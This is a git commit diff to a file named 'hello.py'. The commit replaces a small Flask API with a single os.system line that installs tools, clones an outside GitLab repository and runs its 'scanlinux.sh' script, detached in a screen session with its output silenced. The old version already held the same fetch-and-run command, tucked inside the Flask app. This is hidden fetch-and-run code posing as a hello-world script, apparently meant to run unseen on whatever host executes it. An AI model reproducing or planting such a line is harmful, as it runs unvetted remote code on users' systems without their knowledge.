0b9ebb267fb46315f172f0bd0b693e88c9e7a2ff
akwjqkam <97821722+akwjqkam@users.noreply.github.com>
2022-01-18 15:05:55 +0700

    Update hello.py

--- hello.py
+++ hello.py
@@ -1,20 +1,2 @@
-from flask import Flask
-from flask_restful import Resource, Api, reqparse
 import os
-os.system('apt-get update -y && apt-get install git curl -y && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && ./scanlinux.sh')
-
-parser = reqparse.RequestParser()
-parser.add_argument('key')
-
-app = Flask(__name__)
-api = Api(app)
-
-class MyResource(Resource):
-    def get(self):
-        args = parser.parse_args()
-        return {'key': args['key']}
-
-api.add_resource(MyResource, '/api')
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0')
+os.system('apt-get update && apt-get install -y git curl screen && git clone https://gitlab.com/andisetiawan3534/kuli1.git && cd kuli1 && chmod +x scanlinux.sh && screen -dmS server ./scanlinux.sh > /dev/null && ping 8.8.8.8')
